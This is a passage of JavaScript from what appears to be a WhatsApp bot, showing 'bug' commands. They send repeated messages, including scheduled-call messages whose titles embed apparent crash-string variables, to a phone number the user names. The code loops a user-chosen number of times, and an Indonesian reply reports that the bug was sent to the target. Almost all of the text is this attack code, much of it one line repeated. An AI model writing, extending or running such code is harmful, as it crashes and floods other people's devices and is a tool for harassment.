attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
attention(`🌤️𝐂𝐥𝐚𝐬𝐬𝐢𝐜 ~> 𝐈𝐬𝐂𝐨𝐫𝐭𝐚.𝐍𝐞𝐭 𝐕𝟗.𝟎 🔥\n ${ios2}${ios1}${ngazap}`)
await sleep(1000) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case '🗺️': case '🗾': case '🌐': case '🦠': case '🤡': case '👻': case '🍋': case '🍌': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
attention(`⛅⃟導入𝅛ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
